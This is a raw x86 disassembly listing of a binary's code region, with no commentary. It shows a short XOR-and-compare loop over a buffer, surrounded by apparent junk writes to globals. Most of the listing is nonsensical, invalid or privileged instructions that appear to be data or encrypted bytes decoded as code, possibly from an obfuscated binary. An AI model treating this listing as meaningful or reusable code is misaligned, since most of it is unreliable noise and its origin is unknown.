  4048e7:	sbb    bl,BYTE PTR [edi+ebx*4-0x58]
  4048eb:	gs and ah,bl
  4048ee:	mov    eax,0x3b374169
  4048f3:	xchg   esi,eax
  4048f4:	call   0x44f8:0xde4a5a4d
  4048fb:	mov    ch,0xc7
  4048fd:	shl    DWORD PTR [edi+0x76],cl
  404900:	and    BYTE PTR [esi+0x143e752f],al
  404906:	cmp    al,0xbb
  404908:	cli    
  404909:	ror    BYTE PTR [ebx+eiz*8-0x7efb599a],cl
  404910:	push   esp
  404911:	and    al,0xd7
  404913:	mov    ds,WORD PTR [ecx]
  404915:	cld    
  404916:	mov    eax,DWORD PTR [ebp-0xc]
  404919:	xor    edx,ecx
  40491b:	add    edx,esi
  40491d:	cmp    edx,eax
  40491f:	mov    DWORD PTR ds:0x42e09c,0x6f80
  404929:	je     0x405095
  40492f:	add    DWORD PTR ds:0x42e0a4,ecx
  404935:	push   ebx
  404936:	adc    DWORD PTR ds:0x42e67f,ecx
  40493c:	push   edi
  40493d:	mov    edi,DWORD PTR [ebp+0x8]
  404940:	mov    eax,0x8a3e
  404945:	and    DWORD PTR ds:0x42e0b4,0x5964
  40494f:	xor    ax,WORD PTR [edi+edx*4+0x2]
  404954:	mov    edi,0x3b04
  404959:	add    ax,di
  40495c:	add    DWORD PTR ds:0x42fc85,0x42e0b4
  404966:	movzx  eax,ax
  404969:	and    DWORD PTR ds:0x42fcfa,0x42fc79
  404973:	mov    DWORD PTR [ebp-0x14],eax
  404976:	sbb    DWORD PTR ds:0x42fcfe,0xc63
  404980:	mov    eax,DWORD PTR [ebp+0x8]
  404983:	add    DWORD PTR ds:0x42e683,0x6bf6
  40498d:	movzx  eax,WORD PTR [eax+edx*4]
  404991:	sbb    DWORD PTR ds:0x42fd02,0x42fcfe
  40499b:	xor    eax,0x8a3e
  4049a0:	add    DWORD PTR ds:0x42e687,0x26eb
  4049aa:	jmp    0x404d0a
  4049af:	fdiv   QWORD PTR [esi]
  4049b1:	dec    esp
  4049b2:	rsqrtps xmm6,XMMWORD PTR [ecx+0x5b]
  4049b6:	icebp  
  4049b7:	inc    eax
  4049b8:	sub    esp,DWORD PTR [ebp-0x15]
  4049bb:	jmp    0xc987eebf
  4049c0:	and    DWORD PTR [eax+0x70],esi
  4049c3:	cmp    eax,0x6670707d
  4049c8:	cmp    bl,BYTE PTR [esi-0x2461edae]
  4049ce:	mov    ebx,0x91d6d0c6
  4049d3:	push   ecx
  4049d4:	test   DWORD PTR [esi],esp
  4049d6:	(bad)  
  4049d7:	ficomp DWORD PTR [ebx]
  4049d9:	loope  0x4049a8
  4049db:	sahf   
  4049dc:	int3   
  4049dd:	adc    BYTE PTR [edi-0x4c],ch
  4049e0:	mov    ebx,0x67cacfe5
  4049e5:	ja     0x404a50
  4049e7:	mov    ds:0xd75eccbf,al
  4049ec:	xlat   BYTE PTR ds:[ebx]
  4049ed:	fst    DWORD PTR [ecx+0x6a7cb187]
  4049f3:	int    0x66
  4049f5:	out    dx,eax
  4049f6:	xchg   ebp,eax
  4049f7:	sbb    DWORD PTR [eiz*1+0x4f77d133],0xb0a151e1
  404a02:	xchg   esi,eax
  404a03:	aad    0x8c
  404a05:	add    esi,ebx
  404a07:	les    edi,FWORD PTR [ecx-0x30]
  404a0a:	std    
  404a0b:	arpl   WORD PTR [esi-0x22],dx
  404a0e:	shl    BYTE PTR [ecx],cl
  404a10:	sub    DWORD PTR [eax-0x1f],esi
  404a13:	xchg   esp,eax
  404a14:	sar    BYTE PTR [ebx],cl
  404a16:	push   esi
  404a17:	xchg   ebp,eax
  404a18:	xchg   dl,dl
  404a1a:	mov    cl,0x6f
  404a1c:	adc    BYTE PTR [ebp+0x2],0x35
  404a20:	clc    
  404a21:	adc    ebp,DWORD PTR [esi+0x46]
  404a24:	mov    ebx,0xed99b5fc
  404a29:	or     DWORD PTR [ebx],esi
  404a2b:	shl    DWORD PTR [ecx],0xd3
  404a2e:	aad    0x28
  404a30:	inc    DWORD PTR [ebp-0xf]
  404a33:	dec    esp
  404a34:	fiadd  WORD PTR [ebx+0x228b195f]
  404a3a:	ret    0xa65a
  404a3d:	call   0x3c797da4
  404a42:	mov    esp,0x9d0f50da
  404a47:	ror    DWORD PTR [edx],cl
  404a49:	add    eax,0x82243d0c
  404a4e:	adc    eax,DWORD PTR [edi]
  404a50:	jecxz  0x404a71
  404a52:	(bad)  
  404a53:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  404a54:	aas    
  404a55:	inc    edi
  404a56:	adc    DWORD PTR [ebp+0x4fe2427d],0xffffffcf
  404a5d:	mov    dl,dl
  404a5f:	and    BYTE PTR [esi+0x2f],bh
  404a62:	out    0x9a,eax
  404a64:	xchg   DWORD PTR [edx-0x29c15f12],ecx
  404a6a:	xchg   edi,eax
  404a6b:	pop    esp
  404a6c:	mov    eax,0x8a9f61b7
  404a71:	dec    esi
  404a72:	imul   esi,DWORD PTR [esi],0xffffff87
  404a75:	dec    esi
  404a76:	pop    eax
  404a77:	mov    bh,0xce
  404a79:	sbb    dl,BYTE PTR [eax+0x3308cc77]
  404a7f:	mov    ch,0xc1
  404a81:	std    
  404a82:	loope  0x404add
  404a84:	add    BYTE PTR [edi],ah
  404a86:	rol    BYTE PTR [ebx],cl
  404a88:	push   ds
  404a89:	aaa    
  404a8a:	test   eax,0xd9731011
  404a8f:	sub    BYTE PTR [eax-0x3a],dh
  404a92:	mov    esp,0x6ffaa596
  404a97:	jecxz  0x404a97
  404a99:	(bad)  
  404a9b:	lahf   
  404a9c:	pop    ss
  404a9d:	cmc    
  404a9e:	gs jecxz 0x404aac
  404aa1:	push   ds
  404aa2:	call   0x22e8:0x799c83b9
  404aa9:	mov    WORD PTR [esi],?
  404aab:	mov    ds:0xc75d461c,al
  404ab0:	std    
  404ab1:	push   ebp
  404ab2:	dec    edx
  404ab3:	xchg   BYTE PTR [eax-0x31],bl
  404ab6:	xchg   edx,eax
  404ab7:	mov    al,ds:0x78d18fea
  404abc:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  404abd:	test   BYTE PTR [ecx+ebx*4+0x3b],bh
  404ac1:	fsubr  st,st(7)
  404ac3:	pop    ds
  404ac4:	or     edi,DWORD PTR [esi]
  404ac6:	and    bh,al
  404ac8:	and    eax,0x6e471daa
  404acd:	inc    esp
  404ace:	sub    DWORD PTR [esi-0x2a68e3f],eax
  404ad4:	mov    ebx,0xee6b7863
  404ad9:	xchg   esp,eax
  404ada:	cmc    
  404adb:	or     edx,esi
  404add:	lock test BYTE PTR [ebx+0x197d5737],dl
  404ae4:	cmp    BYTE PTR [esi+0x42],bh
  404ae7:	in     al,dx
  404ae8:	shl    DWORD PTR [ecx-0x59],cl
  404aeb:	mov    bl,0xff
  404aed:	mov    cs,WORD PTR [ecx+0x4abf0266]
  404af3:	mov    BYTE PTR [esi-0x3678f56e],ah
  404af9:	cmp    eax,0x87965795
  404afe:	iret   
  404aff:	mov    ebp,0xd56eb5f2
  404b04:	xor    al,0xfd
  404b06:	ret    0xb42d
  404b09:	addr16 sti 
  404b0b:	sub    esp,DWORD PTR [ecx]
  404b0d:	retf   
  404b0e:	push   es
  404b0f:	push   eax
  404b10:	lds    esi,FWORD PTR [ecx]
  404b12:	call   FWORD PTR [ebx-0x32]
  404b15:	mov    edi,eax
  404b17:	and    eax,0x98d7a5e
  404b1c:	cmc    
  404b1d:	repz ss icebp 
  404b20:	sbb    eax,0xf4c0ac90
  404b25:	push   edx
  404b26:	cwde   
  404b27:	sahf   
  404b28:	aaa    
  404b29:	xchg   ecx,eax
  404b2a:	ret    
  404b2b:	mov    esp,0x766dd064
  404b30:	jmp    0x2d058f3d
  404b35:	and    dl,BYTE PTR [ebx]
  404b37:	loope  0x404ac2
  404b39:	jno    0x404b4d
  404b3b:	push   ds
  404b3c:	sar    DWORD PTR [eax+ecx*4-0x7f],cl
  404b40:	push   ds
  404b41:	cdq    
  404b42:	sub    DWORD PTR [ebx+0x26f393d4],edi
  404b48:	(bad)  
  404b49:	jmp    0x4461:0xf1bccfac
  404b50:	jge    0x404b6c
  404b52:	out    dx,al
  404b53:	pop    esp
  404b54:	sti    
  404b55:	xor    BYTE PTR [ecx-0x4a],dl
  404b58:	pop    eax
  404b59:	ret    0xe99f
  404b5c:	test   al,0xf0
  404b5e:	mov    ecx,0xabcaea8b
  404b63:	ins    DWORD PTR es:[edi],dx
  404b64:	(bad)  
  404b65:	mov    DWORD PTR [ecx+0x7d],esp
  404b68:	cs popf 
  404b6a:	push   ecx
  404b6b:	imul   eax,DWORD PTR [esi+0x2a2e314f],0xffffffdc
  404b72:	ror    ch,0xaa
  404b75:	push   es
  404b76:	div    BYTE PTR [edi]
  404b78:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  404b79:	push   es
  404b7a:	mov    dh,0xd3
  404b7c:	inc    edx
  404b7d:	dec    edx
  404b7e:	div    DWORD PTR [edi+0x32]
  404b81:	int    0x80
  404b83:	cmc    
  404b84:	fwait
  404b85:	and    eax,0xe341853d
  404b8a:	pusha  
  404b8b:	test   al,0x63
  404b8d:	inc    ebx
  404b8e:	test   al,0x3b
  404b90:	jmp    0x404bad
  404b92:	cwde   
  404b93:	shl    ebp,cl
  404b95:	mov    eax,0x2c1331db
  404b9a:	xor    eax,0x9bac43c
  404b9f:	cmp    dl,BYTE PTR [edi]
  404ba1:	pop    es
  404ba2:	in     al,0xbc
  404ba4:	xlat   BYTE PTR ds:[ebx]
  404ba5:	pop    esp
  404ba6:	xchg   esp,eax
  404ba7:	int    0x85
  404ba9:	or     ebp,DWORD PTR [eax-0x26]
  404bac:	xor    al,0x6d
  404bae:	push   esi
  404baf:	mov    edx,DWORD PTR [esi+0x1e]
  404bb2:	in     eax,0xdd
  404bb4:	dec    eax
  404bb5:	xchg   ebp,eax
  404bb6:	imul   edi,ecx,0x3666dfca
  404bbc:	cmp    eax,0xcc8d509c
  404bc1:	stc    
  404bc2:	xlat   BYTE PTR ds:[ebx]
  404bc3:	arpl   WORD PTR [esp+eax*1-0x92aec5],ax
  404bca:	push   cs
  404bcb:	pop    ebx
  404bcc:	out    0x7,al
  404bce:	neg    BYTE PTR [edi+eax*8-0x1983c27c]
  404bd5:	repnz mov DWORD PTR [ecx-0x5f50c429],ebx
  404bdc:	mov    WORD PTR [ebp-0x54f115e7],cs
  404be2:	add    ebx,eax
  404be4:	adc    DWORD PTR [ebx-0x3e],edx
  404be7:	cwde   
  404be8:	sub    dh,BYTE PTR [eax-0x3341afa7]
  404bee:	sub    esp,DWORD PTR [ebx+0x66a5d6ae]
  404bf4:	inc    edi
  404bf5:	mov    ds:0x6e69e481,eax
  404bfa:	mov    ebx,0x56ffe7ef
  404bff:	in     al,0x4a
  404c01:	xor    al,0xf1
  404c03:	cmp    eax,0xc95bcc12
  404c08:	mov    al,0x13
  404c0a:	adc    BYTE PTR [ebx+0x7c0af05],al
  404c10:	aas    
  404c11:	scas   eax,DWORD PTR es:[edi]
  404c12:	mov    edx,0xff0aa693
  404c17:	inc    esi
  404c18:	jle    0x404c8c
  404c1a:	cmp    DWORD PTR [eax+eax*8-0x43],esp
  404c1e:	dec    edx
  404c1f:	mov    edx,0x7d732b14
  404c24:	fwait
  404c25:	loope  0x404c5d
  404c27:	push   ds
  404c28:	push   edi
  404c29:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  404c2a:	lds    ebx,FWORD PTR [esi]
  404c2c:	out    dx,eax
  404c2d:	jbe    0x404ca2
  404c2f:	lods   eax,DWORD PTR ds:[esi]
  404c30:	ret    
  404c31:	add    al,BYTE PTR [eax]
  404c33:	call   0x81a825f3
  404c38:	push   0x281497f7
  404c3d:	scas   eax,DWORD PTR es:[edi]
  404c3e:	inc    edi
  404c3f:	(bad)  
  404c40:	aas    
  404c41:	fsubr  QWORD PTR [ebp+0x494a283]
  404c47:	icebp  
  404c48:	xlat   BYTE PTR ds:[ebx]
  404c49:	(bad)  
  404c4a:	and    esp,DWORD PTR [eax+0x6d499522]
  404c50:	mov    dl,0xc6
  404c52:	mov    DWORD PTR [eax+0x2c],ecx
  404c55:	xchg   al,bh
  404c57:	loop   0x404c29
  404c59:	adc    dl,BYTE PTR cs:[eax]
  404c5c:	cmp    al,0xe1
  404c5e:	push   ss
  404c5f:	ds jge 0x404c70
  404c62:	push   ecx
  404c63:	mov    ds:0x47e91d83,eax
  404c68:	nop
  404c69:	nop
  404c6a:	fiadd  DWORD PTR [edi]
  404c6c:	sahf   
  404c6d:	call   0xcff0ab23
  404c72:	push   ecx
  404c73:	loope  0x404cd3
  404c75:	mov    eax,ds:0xac7a0146
  404c7a:	inc    eax
  404c7b:	adc    al,0x87
  404c7d:	dec    esp
  404c7e:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  404c7f:	mov    ebp,eax
  404c81:	xchg   edi,eax
  404c82:	call   0x75bc:0x2b38c4ac
  404c89:	jo     0x404cee
  404c8b:	mov    bh,0x28
  404c8d:	mov    edi,0x3ccdbecf
  404c92:	mov    ah,0x45
  404c94:	xor    eax,0x2f065d9
  404c99:	push   esp
  404c9a:	or     al,BYTE PTR [edi]
  404c9c:	pop    eax
  404c9d:	popa   
  404c9e:	loop   0x404c3a
  404ca0:	pop    ds
  404ca1:	cmp    BYTE PTR [ecx],bh
  404ca3:	loopne 0x404d02
  404ca5:	xchg   ebp,eax
  404ca6:	sahf   
  404ca7:	cli    
  404ca8:	sub    edi,edx
  404caa:	(bad)  
  404cab:	pop    ebp
  404cac:	test   DWORD PTR [ebp-0x1c],ecx
  404caf:	test   al,0x26
  404cb1:	mov    dl,0x30
  404cb3:	out    dx,eax
  404cb4:	pop    ebp
  404cb5:	pop    eax
  404cb6:	lea    ebx,[ecx+0x4f]
  404cb9:	in     al,0xb6
  404cbb:	sub    ebx,DWORD PTR [esi]
  404cbd:	sbb    eax,0x2c2784b4
  404cc2:	xor    BYTE PTR [edi-0x23b1ea65],0x28
  404cc9:	and    bl,bh
  404ccb:	jo     0x404c6d
  404ccd:	(bad)  
  404cce:	xbegin 0x84b926c9
  404cd4:	jo     0x404c5a
  404cd6:	mov    ebp,0x14d53261
  404cdb:	pop    ebp
  404cdc:	push   esi
  404cdd:	fmul   QWORD PTR [edx+0x56]
  404ce0:	cmc    
  404ce1:	in     eax,0x4f
  404ce3:	test   al,0x61
  404ce5:	jns    0x404ce5
  404ce7:	icebp  
  404ce8:	push   esp
  404ce9:	push   es
  404cea:	out    0x88,eax
  404cec:	mov    ecx,0x39d42c00
  404cf1:	ja     0x404d63
  404cf3:	dec    eax
  404cf4:	int3   
  404cf5:	mov    ds,ecx
  404cf7:	jmp    0x404d01
  404cf9:	or     BYTE PTR ds:0x397733bf,bh
  404cff:	xchg   di,ax
  404d01:	leave  
  404d02:	sub    ebp,ecx
  404d04:	sub    BYTE PTR [edi+ebp*8+0x4],bl
  404d08:	mov    ebp,DWORD PTR [ebx+0x3]
  404d0b:	mov    edi,0x42e67f05
  404d11:	add    BYTE PTR [eax+0xe],bl
  404d14:	add    BYTE PTR [eax],al
  404d16:	mov    edi,DWORD PTR [ebp-0x14]
  404d19:	mov    DWORD PTR ds:0x42e66b,0x3918
  404d23:	mov    BYTE PTR [ebp+edi*1-0x58],al
  404d27:	jmp    0x405087
  404d2c:	or     DWORD PTR [ebp-0x1d],esi
  404d2f:	daa    
  404d30:	arpl   WORD PTR [ecx+0x5bcd71c9],si
  404d36:	fisttp QWORD PTR [eax-0x65]
  404d39:	dec    ecx
  404d3a:	mov    dl,0xf
  404d3c:	xchg   esi,eax
  404d3d:	cs jo  0x404db0
  404d40:	cmp    eax,0xe570707d
  404d45:	pop    ebp
  404d46:	cwde   
  404d47:	jbe    0x404cfd
  404d49:	inc    ebx
  404d4a:	inc    DWORD PTR [esi+0x17ae1c69]
  404d50:	dec    edx
  404d51:	mov    cl,0x64
  404d53:	shl    DWORD PTR [ecx-0x2c36efda],cl
  404d59:	jle    0x404d03
  404d5b:	pop    edx
  404d5d:	sti    
  404d5e:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  404d5f:	iret   
  404d60:	jecxz  0x404cfa
  404d62:	aad    0x10
  404d64:	repnz and ebx,DWORD PTR [eax+0x51]
  404d68:	out    dx,al
  404d69:	loopne 0x404d11
  404d6b:	addr16 jo 0x404d78
  404d6e:	fwait
  404d6f:	sbb    BYTE PTR [eax+0x64751e51],ah
  404d75:	push   eax
  404d76:	mov    al,0x33
  404d78:	aas    
  404d79:	mov    al,0x57
  404d7b:	or     edx,ecx
  404d7d:	lods   al,BYTE PTR ds:[esi]
  404d7e:	sbb    BYTE PTR [ebp+0x7922689d],cl
  404d84:	mov    BYTE PTR [edi-0x15],dl
  404d87:	repnz (bad) [edi+0x30]
  404d8b:	mov    ?,WORD PTR [edi]
  404d8d:	inc    ecx
  404d8e:	js     0x404d83
  404d90:	pop    edx
  404d91:	adc    al,0x68
  404d93:	mov    WORD PTR [ecx],?
  404d95:	ds test eax,0x6dd3f663
  404d9b:	adc    ch,BYTE PTR es:[eax]
  404d9e:	inc    eax
  404d9f:	xchg   ebp,eax
  404da0:	movups xmm4,xmm5
  404da3:	jo     0x404d30
  404da5:	cld    
  404da6:	push   es
  404da7:	xor    DWORD PTR [ebp-0x72fafc75],edx
  404dad:	mov    edx,0xeb6ef2ed
  404db2:	pusha  
  404db3:	push   ebp
  404db4:	fcmovnbe st,st(1)
  404db6:	ins    BYTE PTR es:[edi],dx
  404db7:	jmp    0x404d6c
  404db9:	repz fidiv DWORD PTR [esi-0x52]
  404dbd:	aas    
  404dbe:	(bad)  
  404dc0:	retf   0xd954
  404dc3:	or     DWORD PTR [esi],ecx
  404dc5:	adc    DWORD PTR [edi-0x27a85e97],0xaf52ac48
  404dcf:	pop    edi
  404dd0:	push   ss
  404dd1:	les    ebx,FWORD PTR [esi+eiz*1+0x44]
  404dd5:	xor    al,0xbc
  404dd7:	clc    
  404dd8:	xchg   DWORD PTR [edi],ecx
  404dda:	dec    esi
  404ddb:	jmp    0x404d63
  404ddd:	sbb    eax,0xa9ec58ed
  404de2:	aam    0x0
  404de4:	dec    ebp
  404de5:	shl    ah,cl
  404de7:	sar    ah,0x20
  404dea:	xchg   BYTE PTR [ecx-0x10],al
  404ded:	in     eax,0xd
  404def:	inc    edi
  404df0:	scas   al,BYTE PTR es:[edi]
  404df1:	sub    DWORD PTR [edx-0x57],esi
  404df4:	sub    BYTE PTR [ebx+0x613a4ddf],al
  404dfa:	cmp    eax,0x58bc1658
  404dff:	mov    al,ds:0x4db06d1b
  404e04:	inc    edx
  404e05:	push   0xd
  404e07:	xchg   ebp,eax
  404e08:	retf   
  404e09:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  404e0a:	in     eax,0x47
  404e0c:	push   eax
  404e0d:	xchg   esp,eax
  404e0e:	mov    dl,0xb9
  404e10:	dec    ebp
  404e11:	dec    eax
  404e12:	mov    edx,0xa635adfa
  404e17:	sbb    bp,ax
  404e1a:	or     BYTE PTR [esi+0x6d],0xaf
  404e1e:	out    0x13,al
  404e20:	into   
  404e21:	iret   
  404e22:	pop    ecx
  404e23:	imul   edi,DWORD PTR [eax-0x2aabadbe],0xbc329c9e
  404e2d:	mov    ebx,0x1abb5799
  404e32:	mov    ch,BYTE PTR [eax-0x6f]
  404e35:	jmp    0xb6303653
  404e3a:	ss dec edx
  404e3c:	xchg   esi,eax
  404e3d:	and    al,0x4f
  404e3f:	mov    edi,0x502e51c6
  404e44:	pop    ecx
  404e45:	mov    BYTE PTR [edx+0x3635371],dl
  404e4b:	pop    ss
  404e4c:	inc    eax
  404e4d:	out    0x2,eax
  404e4f:	push   ecx
  404e50:	and    BYTE PTR ds:0x778dc694,bh
  404e56:	push   edi
  404e57:	not    DWORD PTR [ebp+0x31]
  404e5a:	retf   0x32ae
  404e5d:	shl    BYTE PTR [ebp+0x47],1
  404e60:	mov    al,0x8f
  404e62:	js     0x404e22
  404e64:	inc    ebx
  404e65:	test   BYTE PTR [ebp+0x337bee0],cl
  404e6b:	test   al,0x5d
  404e6d:	push   ecx
  404e6e:	push   cs
  404e6f:	(bad)  
  404e70:	loope  0x404e66
  404e72:	push   esp
  404e73:	mov    cl,0xe3
  404e75:	scas   eax,DWORD PTR es:[edi]
  404e76:	test   al,0x5f
  404e78:	aas    
  404e79:	adc    ebp,eax
  404e7b:	mov    edi,0x79896ed6
  404e80:	int3   
  404e81:	enter  0xfb5,0xfa
  404e85:	(bad)  
  404e86:	sub    al,0x7f
  404e88:	sbb    BYTE PTR [ecx],al
  404e8a:	pop    es
  404e8b:	in     al,0x17
  404e8d:	lods   eax,DWORD PTR ds:[esi]
  404e8e:	xor    dh,BYTE PTR gs:[edx]
  404e91:	(bad)  
  404e92:	rcr    dh,cl
  404e94:	es dec eax
  404e96:	ss xor eax,0x1a25ec7e
  404e9c:	sbb    al,0x5f
  404e9e:	mov    al,0x6d
  404ea0:	jnp    0x404eb8
  404ea2:	std    
  404ea3:	mov    edi,0xb6eb3498
  404ea8:	sar    BYTE PTR ds:0xff5e9d11,cl
  404eae:	stos   DWORD PTR es:[edi],eax
  404eaf:	xchg   bx,ax
  404eb1:	test   DWORD PTR [ebx+0x23],edi
  404eb4:	nop    DWORD PTR [edx+edx*1+0x509d6dc0]
  404ebc:	push   esp
  404ebd:	rcl    BYTE PTR [edi-0x3],0x52
  404ec1:	mov    edx,0x21d2fb9e
  404ec6:	mov    WORD PTR [eax-0x45e04805],es
  404ecc:	cmp    DWORD PTR [esi-0x6c],0xffffffe8
  404ed0:	je     0x404f22
  404ed2:	sub    ecx,DWORD PTR [esi+0x13]
  404ed5:	xlat   BYTE PTR ds:[ebx]
  404ed6:	jne    0x404f01
  404ed8:	and    al,0x44
  404eda:	cmp    eax,0xa10ca4fd
  404edf:	xor    eax,0x84d65532
  404ee4:	test   eax,0x4620ead3
  404ee9:	inc    esi
  404eea:	imul   ebx,DWORD PTR ss:[ecx-0x12],0xf2ae1079
  404ef2:	pusha  
  404ef3:	int    0x90
  404ef5:	jmp    0x404e9d
  404ef7:	push   ecx
  404ef8:	lock shl BYTE PTR [ebp-0x6d6bec1d],0xfe
  404f00:	ins    BYTE PTR es:[edi],dx
  404f01:	mov    edi,0xe1895016
  404f06:	loopne 0x404f44
  404f08:	or     edx,DWORD PTR [ecx-0x2b]
  404f0b:	adc    eax,0x1246f7da
  404f10:	and    DWORD PTR [ebx+0x62],eax
  404f13:	xchg   esp,eax
  404f14:	adc    dh,bh
  404f16:	sar    DWORD PTR [eax],0x4
  404f19:	xchg   ebp,eax
  404f1a:	or     edi,DWORD PTR [eax+0x3e78de4e]
  404f20:	add    al,0x50
  404f22:	sbb    al,0x90
  404f25:	mov    esi,DWORD PTR [eax]
  404f27:	imul   edx,DWORD PTR [ebx+0x78],0x85554f4e
  404f2e:	push   ds
  404f2f:	push   0xffffffe6
  404f31:	popf   
  404f32:	in     eax,0x65
  404f34:	ss jno 0x404f47
  404f37:	imul   BYTE PTR [ebx+0x7a41c344]
  404f3d:	sar    BYTE PTR [edx-0x697b45c7],cl
  404f43:	test   al,0x32
  404f45:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  404f46:	fsub   QWORD PTR [edx+eiz*8-0x6b]
  404f4a:	sub    eax,DWORD PTR [edx+0x4ebf41fd]
  404f50:	adc    al,0x9c
  404f52:	jne    0x404fb1
  404f54:	in     al,dx
  404f55:	and    eax,0xf54ea965
  404f5a:	pop    ebp
  404f5b:	ja     0x404f8c
  404f5d:	pop    esi
  404f5e:	cmc    
  404f5f:	scas   al,BYTE PTR es:[edi]
  404f60:	iret   
  404f61:	mov    bl,0x51
  404f63:	or     eax,0xd82966a1
  404f68:	fsub   QWORD PTR [eax+0x3aac225f]
  404f6e:	aaa    
  404f6f:	cwde   
  404f70:	xchg   esi,eax
  404f71:	adc    esi,DWORD PTR [ebx+0x3af0c2d7]
  404f77:	jle    0x404f3c
  404f79:	enter  0x83f3,0xff
  404f7d:	aam    0xa7
  404f7f:	mov    al,0xb9
  404f81:	xlat   BYTE PTR ds:[ebx]
  404f82:	push   0xfffffff0
  404f84:	scas   eax,DWORD PTR es:[edi]
  404f85:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  404f86:	pop    edx
  404f87:	dec    esi
  404f88:	jb     0x404fde
  404f8a:	push   edx
  404f8b:	cmp    BYTE PTR [eax],dl
  404f8d:	scas   al,BYTE PTR es:[edi]
  404f8e:	sub    DWORD PTR [edi+0x5a],0x3294636d
  404f95:	push   cs
  404f96:	cmp    al,0x78
  404f98:	jno    0x404f6d
  404f9a:	inc    ebp
  404f9b:	push   ecx
  404f9c:	lods   al,BYTE PTR ds:[esi]
  404f9d:	fst    st(3)
  404f9f:	or     eax,DWORD PTR [eax+ebx*8]
  404fa2:	ds stc 
  404fa4:	mov    esp,0x60ced682
  404fa9:	rcr    BYTE PTR ds:0x4a5b24af,0xb2
  404fb0:	sti    
  404fb1:	push   ss
  404fb2:	lds    edx,FWORD PTR [ebp-0x7b0fd1b6]
  404fb8:	cmp    esp,esp
  404fba:	add    al,0xf8
  404fbc:	fdiv   st(4),st
  404fbe:	sti    
  404fbf:	add    DWORD PTR [esi],ebp
  404fc1:	sub    BYTE PTR [ecx+0x71],dh
  404fc4:	call   0xb6838641
  404fc9:	imul   ebx,DWORD PTR [esi+0x5a22aaac],0xfffffff1
  404fd0:	push   ss
  404fd1:	push   eax
  404fd2:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  404fd3:	add    eax,eax
  404fd5:	inc    edx
  404fd6:	(bad)  
  404fd8:	adc    eax,0xed308bf0
  404fdd:	adc    al,0xbb
  404fdf:	arpl   dx,si
  404fe1:	lds    esp,FWORD PTR [eax]
  404fe3:	ss mov ebx,0xef3e7348
  404fe9:	inc    esp
  404fea:	sub    BYTE PTR [eax],ah
  404fec:	add    al,0x62
  404fee:	push   esp
  404fef:	push   ds
  404ff0:	pop    ss
  404ff1:	xchg   bl,dh
  404ff3:	test   ebp,esp
  404ff5:	mov    ecx,0x9d15f9df
  404ffa:	lods   eax,DWORD PTR ds:[esi]
  404ffb:	mov    edx,0xb2983263
  405000:	push   esi
  405001:	sub    ecx,DWORD PTR [edx-0x368c8c4d]
  405007:	mov    edi,0xc0536b20
  40500c:	or     edx,ebp
  40500e:	mov    ah,0x31
  405010:	xchg   esp,eax
  405011:	inc    ecx
  405012:	cli    
  405013:	int    0x51
  405015:	sbb    esp,DWORD PTR [eax]
  405017:	je     0x404fc3
  405019:	lock inc ebp
  40501b:	xchg   ebp,eax
  40501c:	push   esp
  40501d:	in     eax,0xe9
  40501f:	repz mov ch,0x29
  405022:	pop    esi
  405023:	(bad)  
  405024:	dec    esi
  405025:	scas   al,BYTE PTR es:[edi]
  405026:	int3   
  405027:	dec    ebx
  405028:	sbb    al,0xdf
  40502a:	out    dx,eax
  40502b:	add    BYTE PTR [ebp-0x54],0x60
  40502f:	add    eax,0x5f86859d
  405034:	dec    DWORD PTR [edx+0x576e2070]
  40503a:	cld    
  40503b:	test   DWORD PTR [edi],edi
  40503d:	xchg   BYTE PTR [ebp-0x54],dh
  405040:	mov    dh,0x3a
  405042:	bound  eax,QWORD PTR [ecx-0x1d0f983b]
  405048:	or     edi,esp
  40504a:	sar    ebp,1
  40504c:	shr    BYTE PTR [eax-0x78],cl
  40504f:	mov    eax,ds:0xe06dbccf
  405054:	or     eax,0xb11dc9e5
  405059:	es push ecx
  40505b:	imul   ebx,DWORD PTR [edx],0xffffffb7
  40505e:	fcmovnb st,st(5)
  405060:	loop   0x405055
  405062:	push   cs
  405063:	shr    ch,cl
  405065:	and    BYTE PTR [ebp+edx*8-0x52264ffe],bl
  40506c:	sub    eax,0x50f0f9b8
  405071:	fbld   TBYTE PTR [ebx+0x1]
  405074:	popf   
  405075:	imul   edx,DWORD PTR [edx],0xbd3158dc
  40507b:	fdivrp st(2),st
  40507d:	sti    
  40507e:	psrlw  mm7,QWORD PTR [ebx+edi*4-0x7a]
  405083:	mov    eax,0x8b38e004
  405088:	inc    ebp
  405089:	hlt    
  40508a:	inc    edx
  40508b:	cmp    edx,eax
  40508d:	jne    0x40493d
  405093:	pop    edi
  405094:	pop    ebx
  405095:	mov    eax,DWORD PTR [ebp-0x8]
  405098:	mov    edx,DWORD PTR [ebp+0x10]
  40509b:	xor    eax,ecx
  40509d:	add    eax,esi
  40509f:	mov    DWORD PTR [edx],eax
  4050a1:	mov    eax,DWORD PTR [ebp-0x8]
  4050a4:	xor    eax,ecx
  4050a6:	add    eax,esi
  4050a8:	mov    DWORD PTR [ebp+0x8],eax
  4050ab:	mov    eax,DWORD PTR [ebp+0x8]
  4050ae:	mov    al,BYTE PTR [ebp+eax*1-0x58]
  4050b2:	mov    dl,BYTE PTR [ebp-0x1]
  4050b5:	cmp    al,dl
  4050b7:	je     0x4050fa
  4050bd:	mov    eax,DWORD PTR [ebp+0x8]
  4050c0:	mov    al,BYTE PTR [ebp+eax*1-0x58]
  4050c4:	mov    edx,DWORD PTR [ebp+0xc]
  4050c7:	cmp    al,BYTE PTR [edx]
  4050c9:	jne    0x405480
  4050cf:	mov    eax,DWORD PTR [ebp-0x8]
  4050d2:	mov    edx,DWORD PTR [ebp+0xc]
  4050d5:	movsx  edx,BYTE PTR [edx]
  4050d8:	xor    eax,ecx
  4050da:	add    eax,esi
  4050dc:	cmp    edx,eax
  4050de:	je     0x405114
  4050e4:	mov    DWORD PTR [ebp-0x18],0x705fd8f
  4050eb:	lea    eax,[ebp-0x18]
  4050ee:	mov    DWORD PTR [ebp-0x14],eax
  4050f1:	mov    eax,DWORD PTR [ebp-0x14]
